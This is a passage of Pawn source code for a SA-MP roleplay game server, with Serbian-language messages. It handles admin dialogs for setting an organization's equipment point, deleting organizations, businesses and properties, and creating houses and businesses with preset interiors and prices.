		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		org_info[ id ][ oEquipPoint ][ 0 ] = Pos[ 0 ];
		org_info[ id ][ oEquipPoint ][ 1 ] = Pos[ 1 ];
		org_info[ id ][ oEquipPoint ][ 2 ] = Pos[ 2 ];
		org_info[ id ][ oEquipInt ] = GetPlayerInterior( playerid );
        org_info[ id ][ oEquipVW ] = GetPlayerVirtualWorld( playerid );

		if( IsValidDynamic3DTextLabel( org_info[id][oEquip3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oEquip3D] );
		if( IsValidDynamicPickup( org_info[id][oEquipPickup] ) ) DestroyDynamicPickup( org_info[id][oEquipPickup] );

		org_info[id][oEquip3D] = CreateDynamic3DTextLabel( "Equipment\nDa uzmete opremu kucajte {FFFFFF}\"/(eq)uipment\"", 0xFF6200FF, org_info[ id ][ oEquipPoint ][ 0 ], org_info[ id ][ oEquipPoint ][ 1 ], org_info[ id ][ oEquipPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oEquipVW ], org_info[ id ][ oEquipInt ], -1, 20.0);
		org_info[id][oEquipPickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oEquipPoint ][ 0 ], org_info[ id ][ oEquipPoint ][ 1 ], org_info[ id ][ oEquipPoint ][ 2 ], org_info[ id ][ oEquipVW ], org_info[ id ][ oEquipInt ], -1, 20.0 );

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `equip_point_pos_x` = '%f', `equip_point_pos_y` = '%f', `equip_point_pos_z` = '%f', `equip_point_int` = '%d', `equip_point_vw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
			org_info[ id ][ oEquipPoint ][ 0 ],
			org_info[ id ][ oEquipPoint ][ 1 ],
			org_info[ id ][ oEquipPoint ][ 2 ],
			org_info[ id ][ oEquipInt ],
			org_info[ id ][ oEquipVW ],
			org_info[ id ][ oID ] );
		mysql_tquery( mSQL, q );

		SendInfoMessage( playerid, "Kreirali ste equipment point za organizaciju ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ORGDELETE && response )
	{
	    new id;
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "{FFFFFF}* Unesi samo ID orge:" );
	    if( sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id organizacije koju zelite obrisati:", "Potvrdi", "Odustani" );
        if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

		if( IsValidDynamic3DTextLabel( org_info[id][o3D] ) ) 		DestroyDynamic3DTextLabel( org_info[id][o3D] );
		if( IsValidDynamicMapIcon( org_info[id][oMapIcon] ) )		DestroyDynamicMapIcon( org_info[id][oMapIcon] );
    	if( IsValidDynamicPickup( org_info[id][oPickup] ) ) 		DestroyDynamicPickup( org_info[id][oPickup] );
    	if( IsValidDynamic3DTextLabel( org_info[id][oSafe3D] ) ) 	DestroyDynamic3DTextLabel( org_info[id][oSafe3D] );
		if( IsValidDynamicPickup( org_info[id][oSafePickup] ) ) 	DestroyDynamicPickup( org_info[id][oSafePickup] );
        if( IsValidDynamic3DTextLabel( org_info[id][oEquip3D] ) )	DestroyDynamic3DTextLabel( org_info[id][oEquip3D] );
		if( IsValidDynamicPickup( org_info[id][oEquipPickup] ) ) 	DestroyDynamicPickup( org_info[id][oEquipPickup] );
        if( IsValidDynamic3DTextLabel( org_info[id][oDuty3D] ) ) 	DestroyDynamic3DTextLabel( org_info[id][oDuty3D] );
		if( IsValidDynamicPickup( org_info[id][oDutyPickup] ) ) 	DestroyDynamicPickup( org_info[id][oDutyPickup] );
		if( IsValidDynamic3DTextLabel( org_info[id][oDiler3D] ) ) 	DestroyDynamic3DTextLabel( org_info[id][oDiler3D] );
    	if( IsValidDynamicActor( org_info[id][oDilerActor] ) ) 		DestroyDynamicActor( org_info[id][oDilerActor] );

        new query[ 100 ];
		mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `organizations` WHERE `org_id` = '%d'", org_info[ id ][ oID ] );
		mysql_tquery( mSQL, query );

    	org_info[ id ][ oID ] = 0;
		strmid( org_info[ id ][ oName ], "", 0, strlen( "" ), ORG_IME );
		strmid( org_info[ id ][ oPreFix ], "", 0, strlen( "" ), 5 );
		strmid( org_info[ id ][ oColor ], "", 0, strlen( "" ), 7 );

		org_info[ id ][ oTip ] = 0;
		org_info[ id ][ oSuspended ] = 0;
		org_info[ id ][ oMaxClanova ] = 0;
	    org_info[ id ][ oUbacenihClanova ] = 0;

	    org_info[ id ][ oSkin1 ] = 0;
		org_info[ id ][ oSkin2 ] = 0;
		org_info[ id ][ oSkin3 ] = 0;
		org_info[ id ][ oSkin4 ] = 0;
		org_info[ id ][ oSkin5 ] = 0;
		org_info[ id ][ oSkin6 ] = 0;

		org_info[ id ][ oZSkin1 ] = 0;
		org_info[ id ][ oZSkin2 ] = 0;
		org_info[ id ][ oZSkin3 ] = 0;
		org_info[ id ][ oZSkin4 ] = 0;
		org_info[ id ][ oZSkin5 ] = 0;
		org_info[ id ][ oZSkin6 ] = 0;

		strmid( org_info[ id ][ oRank1 ], "", 0, strlen( "" ), ORG_RANK );
		strmid( org_info[ id ][ oRank2 ], "", 0, strlen( "" ), ORG_RANK );
		strmid( org_info[ id ][ oRank3 ], "", 0, strlen( "" ), ORG_RANK );
		strmid( org_info[ id ][ oRank4 ], "", 0, strlen( "" ), ORG_RANK );
		strmid( org_info[ id ][ oRank5 ], "", 0, strlen( "" ), ORG_RANK );
		strmid( org_info[ id ][ oRank6 ], "", 0, strlen( "" ), ORG_RANK );

		org_info[ id ][ oPozExtX ] = 0;
		org_info[ id ][ oPozExtY ] = 0;
		org_info[ id ][ oPozExtZ ] = 0;

		org_info[ id ][ oPozIntX ] = 0;
		org_info[ id ][ oPozIntY ] = 0;
		org_info[ id ][ oPozIntZ ] = 0;

	    org_info[ id ][ oInt ] = 0;
		org_info[ id ][ oVw ] = 0;

		org_info[ id ][ oSpawnPoint ][ 0 ] = 0;
		org_info[ id ][ oSpawnPoint ][ 1 ] = 0;
		org_info[ id ][ oSpawnPoint ][ 2 ] = 0;

		org_info[ id ][ oDiler ][ 0 ] = 0;
		org_info[ id ][ oDiler ][ 1 ] = 0;
		org_info[ id ][ oDiler ][ 2 ] = 0;
		org_info[ id ][ oDiler ][ 3 ] = 0;
		org_info[ id ][ oDilerCena ] = 500;

		org_info[ id ][ oDutyPoint ][ 0 ] = 0;
		org_info[ id ][ oDutyPoint ][ 1 ] = 0;
		org_info[ id ][ oDutyPoint ][ 2 ] = 0;
		org_info[ id ][ oDutyInt ] = 0;
		org_info[ id ][ oDutyVW ] = 0;
		org_info[ id ][ oEquipPoint ][ 0 ] = 0;
		org_info[ id ][ oEquipPoint ][ 1 ] = 0;
		org_info[ id ][ oEquipPoint ][ 2 ] = 0;
		org_info[ id ][ oEquipInt ] = 0;
		org_info[ id ][ oEquipVW ] = 0;

	    org_info[ id ][ oSavez ] = 0;

	    org_info[ id ][ oMaxPort ] = 0;

		org_info[ id ][ oSafePos ][ 0 ] = 0;
		org_info[ id ][ oSafePos ][ 1 ] = 0;
		org_info[ id ][ oSafePos ][ 2 ] = 0;

		org_info[ id ][ oSafeMoney ] = 0;
		org_info[ id ][ oSafeDrugAmmount ] = 0;
		org_info[ id ][ oSafeMats ] = 0;

		org_info[ id ][ oEntFromBussines ] = -1;
		org_info[ id ][ oBussinesID ] = -1;

		org_info[ id ][ oEntVw ] = -1;
		org_info[ id ][ oEntInt ] = -1;

		org_info[ id ][ oPortX ] = 0.0;
		org_info[ id ][ oPortY ] = 0.0;
		org_info[ id ][ oPortZ ] = 3.0;
		org_info[ id ][ oPortA ] = 0.0;

    	SendInfoMessage( playerid, "Uspesno ste izbrisali organizaciju ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_FDELETE && response )
	{
	    new id;
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Unesi samo ID firme." );
	    if( sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_FDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite obrisati:", "Potvrdi", "Odustani" );
        if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

        if( IsValidDynamicPickup( FirmaPickup[ id ] ) ) DestroyDynamicPickup( FirmaPickup[ id ] );
		if( IsValidDynamic3DTextLabel( FirmaLabel[ id ] ) ) DestroyDynamic3DTextLabel( FirmaLabel[ id ] );

		new query[ 100 ];
		mysql_format( mSQL, query, sizeof( query ), "DELETE FROM `bussines` WHERE `bussines_id` = '%d'", BusinessInfo[ id ][ b_ID ] );
		mysql_tquery( mSQL, query );

        BusinessInfo[ id ][ b_ID ] = 0;
		BusinessInfo[ id ][ bNeaktivnost ] = 0;
		BusinessInfo[ id ][ bFacture ] = 0;
		BusinessInfo[ id ][ bEnterX ] = 0;
		BusinessInfo[ id ][ bEnterY ] = 0;
		BusinessInfo[ id ][ bEnterZ ] = 0;
	 	BusinessInfo[ id ][ bLocked ] = 0;
		BusinessInfo[ id ][ bLevel ] = 0;
		BusinessInfo[ id ][ bJobID ] = 0;
		BusinessInfo[ id ][ bOwner_sqlID ] = -1;
		BusinessInfo[ id ][ bOnAuction ] = false;

		BusinessInfo[ id ][ bInInt ] = 0;
		BusinessInfo[ id ][ bExitX ] = 0;
		BusinessInfo[ id ][ bExitY ] = 0;
		BusinessInfo[ id ][ bExitZ ] = 0;
		BusinessInfo[ id ][ bPrice ] = 0;
		strmid( BusinessInfo[ id ][ bName ], "", 0, strlen( "" ), 64);
		BusinessInfo[ id ][ bType ] = 0;
		BusinessInfo[ id ][ bInVW ] = 0;
		BusinessInfo[ id ][ bMoney ] = 0;
		BusinessInfo[ id ][ bInt ] = 0;
	    BusinessInfo[ id ][ bVW ] = 0;
	    strmid( BusinessInfo[ id ][ bOwner ], "", 0, strlen( "" ), 32);

	    Iter_Remove(iter_Bizz, id);

    	SendInfoMessage( playerid, "Uspesno ste izbrisali firmu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_IMDELETE && response )
	{
	    new id;
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Unesi samo ID imovine." );
	    if( sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_IMDELETE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite obrisati:", "Potvrdi", "Odustani" );

		if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );

		II[ id ][ iExit ][ 0 ] = 0.0;
  		II[ id ][ iExit ][ 1 ] = 0.0;
  		II[ id ][ iExit ][ 2 ] = 0.0;
		II[ id ][ iEnter ][ 0 ] = 0.0;
		II[ id ][ iEnter ][ 1 ] = 0.0;
	   	II[ id ][ iEnter ][ 2 ] = 0.0;

		if( IsValidDynamicPickup( ImovinaPickup[ id ] ) ) DestroyDynamicPickup( ImovinaPickup[ id ] );
		if( IsValidDynamic3DTextLabel( ImovinaLabel[ id ] ) ) DestroyDynamic3DTextLabel( ImovinaLabel[ id ] );

    	static q[100];
    	mysql_format(mSQL, q, 100, "DELETE FROM `propertys` WHERE `iSQLID` = '%d'", II[id][iSQLID]);
    	mysql_tquery(mSQL, q);

    	Iter_Remove(iter_Imovina, id);

    	SendInfoMessage( playerid, "Uspesno ste izbrisali imovinu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_IMCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
	    if( response )
		{
		    new im = Iter_Free(iter_Imovina);
			if( II[ (MAX_IMOVINA-1) ][ iSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreirane imovine." );

			new vrsta, Float:PozX, Float:PozY, Float:PozZ, string[ 256 ];
	        if( sscanf( inputtext, "i", vrsta ) ) return ShowPlayerDialog( playerid, dialog_IMCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite vrstu kuce koju zelite.\nVrste: 1. Mala kuca | 2. Srednja Kuca | 3. Velika kuca", "Potvrdi", "Nazad" );
			if( vrsta < 1 || vrsta > 3 ) return SendErrorMessage( playerid, "Pogresna vrsta!" );
			GetPlayerPos( playerid, PozX, PozY, PozZ );
			if( II[im][iSQLID] != 0 ) return SendErrorMessage( playerid, "ID te imovine vec postoji." );

			switch(vrsta)
			{
       			case MALA_KUCA:
	   			{
				    II[ im ][ iUsage ] = IMOVINA_KUCA;
				    II[ im ][ iExit ][ 0 ] = MALA_KUCA_X;
		    		II[ im ][ iExit ][ 1 ] = MALA_KUCA_Y;
		    		II[ im ][ iExit ][ 2 ] = MALA_KUCA_Z;
				    II[ im ][ iPrice ] = MALA_KUCA_PRICE;
				    II[ im ][ iInterior ] = MALA_KUCA_INT;
				    II[ im ][ iVrsta ] = MALA_KUCA;
				}
				case SREDNJA_KUCA:
				{
				    II[ im ][ iUsage ] = IMOVINA_KUCA;
				    II[ im ][ iExit ][ 0 ] = SREDNJA_KUCA_X;
		    		II[ im ][ iExit ][ 1 ] = SREDNJA_KUCA_Y;
		    		II[ im ][ iExit ][ 2 ] = SREDNJA_KUCA_Z;
				    II[ im ][ iPrice ] = SREDNJA_KUCA_PRICE;
				    II[ im ][ iInterior ] = SREDNJA_KUCA_INT;
				    II[ im ][ iVrsta ] = SREDNJA_KUCA;
				}
				case VELIKA_KUCA:
				{
				    II[ im ][ iUsage ] = IMOVINA_KUCA;
				    II[ im ][ iExit ][ 0 ] = VELIKA_KUCA_X;
		    		II[ im ][ iExit ][ 1 ] = VELIKA_KUCA_Y;
		    		II[ im ][ iExit ][ 2 ] = VELIKA_KUCA_Z;
				    II[ im ][ iPrice ] = VELIKA_KUCA_PRICE;
				    II[ im ][ iInterior ] = VELIKA_KUCA_INT;
				    II[ im ][ iVrsta ] = VELIKA_KUCA;
				}
			}

			II[ im ][ iOwned ] = 0;
			II[ im ][ iOnAuction ] = false;
			II[ im ][ iOwnerSQLID ] = -1;
   			II[ im ][ iNeaktivnost ] = 0;
			strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			II[ im ][ iEnter ][ 0 ] = PozX;
			II[ im ][ iEnter ][ 1 ] = PozY;
		   	II[ im ][ iEnter ][ 2 ] = PozZ;
		    II[ im ][ iLocked ] = 0;
		    II[ im ][ iVW ] = im;
		    II[ im ][ iLevel ] = 5;
		    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
			II[ im ][ iMats ] = 0;
			II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
			II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
			II[ im ][ iDrugAmmount ] = 0;
	        II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0;
			mSQL_CreateProperty( im );

		    format( string, sizeof( string ),
				"(KUCA - [%d])\n\
				Vrsta: {FFFFFF}%s\n\
				{4282C0}Cena: {FFFFFF}$%d\n\
				{4282C0}Level: {FFFFFF}%d\n\
				{4282C0}Adresa: {FFFFFF}%s\n\
				{4282C0}[ /kupiimovinu ]", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );

			ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x4282C0FF, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
		    ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], .priority = 26 );
			SendInfoMessage( playerid, "Uspesno si kreirao kucu." );
		}
	}
	else if(dialogid == dialog_FCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
    	if( response )
		{
		    new vrsta, Float:PozX, Float:PozY, Float:PozZ, f_string[ 300 ];
			GetPlayerPos( playerid, PozX, PozY, PozZ );

			if( sscanf( inputtext, "i", vrsta ) )
			{
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				strcat( DialogStrgEx, "{FFFFFF}Unesite vrstu firme koju zelite.\n" );
				strcat( DialogStrgEx, "0. 24/7 | 1. Burg | 2. Cluckin Bell | 3. Binco | 4. ((empty)) | 5. Zip | 6. Victim | 7. Suburban\n" );
	            strcat( DialogStrgEx, "8. Bar | 9. Gym | 10. Gun Shop | 11. MRestoran | 12. VRestoran | 13. Pizza | 14. Nocni klub\n" );
				strcat( DialogStrgEx, "15. Disco | 16. Electronic Shop | 17. Trafika | 18. Firma za posao | 19. Rent firma | 20. ((empty))\n" );
				strcat( DialogStrgEx, "21. Javna Kuca | 22. Kladionica | 23. Oglas | 24. ((empty)) | 25. ((empty)) | 26. ((empty))\n" );
				strcat( DialogStrgEx, "27. ((empty)) | 28. ((empty)) | 29. Lutrija | 30. Casino" );

				ShowPlayerDialog( playerid, dialog_FCREATE, DIALOG_STYLE_INPUT, D_NASLOV, DialogStrgEx, "U redu", "" );

				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				return 1;
			}

            if( BusinessInfo[ (MAX_BUSSINES-1) ][ b_ID ] != 0 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj firmi." );
			if( vrsta < 0 || vrsta > 30 ) return SendErrorMessage( playerid, "Pogresna vrsta!" );

			new IDFirme = Iter_Free(iter_Bizz);
			if(IDFirme == -1) return SendErrorMessage(playerid, "Dostigli ste maksimalni broj kreiranih firmi.");

			BusinessInfo[ IDFirme ][ b_ID ] = -1;
            BusinessInfo[ IDFirme ][ bNeaktivnost ] = 0;
            BusinessInfo[ IDFirme ][ bFacture ] = 100;
            BusinessInfo[ IDFirme ][ bOwnerOrg ] = -1;
		    BusinessInfo[ IDFirme ][ bEnterX ] = PozX;
		    BusinessInfo[ IDFirme ][ bEnterY ] = PozY;
	   		BusinessInfo[ IDFirme ][ bEnterZ ] = PozZ;
		    BusinessInfo[ IDFirme ][ bLocked ] = 0;
		    BusinessInfo[ IDFirme ][ bLevel ] = 5;
		    BusinessInfo[ IDFirme ][ bJobID ] = 0;
		    BusinessInfo[ IDFirme ][ bOwner_sqlID ] = -1;
		    BusinessInfo[ IDFirme ][ bOnAuction ] = false;

		    switch(vrsta)
		    {
				case 0: // 24/7 Market
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 18;
		    		BusinessInfo[ IDFirme ][ bExitX ] = -30.9076;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -92.0104;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1003.5469;
				    BusinessInfo[ IDFirme ][ bPrice ] = 500000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Prodavnica 24/7", 0, strlen( "Prodavnica 24/7" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_MARKET;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 1: // Burg
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 10;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 363.1478;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -75.1698;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1001.507812;
				    BusinessInfo[ IDFirme ][ bPrice ] = 350000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Burg", 0, strlen( "Burg" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_BURG;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 2: // Clucking Bell
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 9;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 365.0046;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -11.8387;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1001.8516;
				    BusinessInfo[ IDFirme ][ bPrice ] = 350000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Cluckin Bell", 0, strlen( "Cluckin Bell" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_CLUCK;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 3: // Binco
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 15;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 207.7204;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -110.5464;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1005.132812;
				    BusinessInfo[ IDFirme ][ bPrice ] = 450000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Binco", 0, strlen( "Binco" ), 128);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_BINCO;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 4: // Nema
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 5000000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Nema", 0, strlen( "Nema" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_nema;
				    BusinessInfo[ IDFirme ][ bInVW ] = 0;
				}
		        case 5: // Zip
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 18;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 161.410293;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -96.687202;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1001.804687;
				    BusinessInfo[ IDFirme ][ bPrice ] = 450000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Zip", 0, strlen( "Zip" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_ZIP;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 6: // Victim
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 5;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 227.342803;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -8.243800;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1002.210876;
				    BusinessInfo[ IDFirme ][ bPrice ] = 450000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Victim", 0, strlen( "Victim" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_VICTIM;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 7: // Suburban
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 1;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 203.895294;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -50.656700;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1001.804687;
				    BusinessInfo[ IDFirme ][ bPrice ] = 450000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Suburban", 0, strlen( "Suburban" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_SUBURBAN;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 8: // Bar
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 11;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 501.870788;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -67.582000;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 998.757812;
				    BusinessInfo[ IDFirme ][ bPrice ] = 150000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Bar", 0, strlen( "Bar" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_BAR;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 9: // Gym
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 5;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 772.359375;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -5.515697;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1000.728576;
				    BusinessInfo[ IDFirme ][ bPrice ] = 250000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Gym", 0, strlen( "Gym" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_GYM;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 10: // Gun Shop
				{
		            BusinessInfo[ IDFirme ][ bLevel ] = 10;
					BusinessInfo[ IDFirme ][ bInInt ] = 7;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 315.762786;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -143.661193;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 999.601623;
				    BusinessInfo[ IDFirme ][ bPrice ] = 1000000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Gun Shop", 0, strlen( "Gun Shop" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_GUNSHOP;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 11: // MRestoran
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 4;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 460.265411;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -88.611503;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 999.554687;
				    BusinessInfo[ IDFirme ][ bPrice ] = 300000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Mali Restoran", 0, strlen( "Mali Restoran" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 12: // VRestoran
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 1;
		    		BusinessInfo[ IDFirme ][ bExitX ] = -794.850280;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 489.279693;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1376.195312;
				    BusinessInfo[ IDFirme ][ bPrice ] = 350000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Veliki Restoran", 0, strlen( "Veliki Restoran" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_RESTORAN;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 13: // Pizza
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 5;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 372.2682;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -133.5108;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1001.4922;
				    BusinessInfo[ IDFirme ][ bPrice ] = 750000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Well stacked pizza", 0, strlen( "Well stacked pizza" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_PIZZA;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 14: // Nocni klub
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 3;
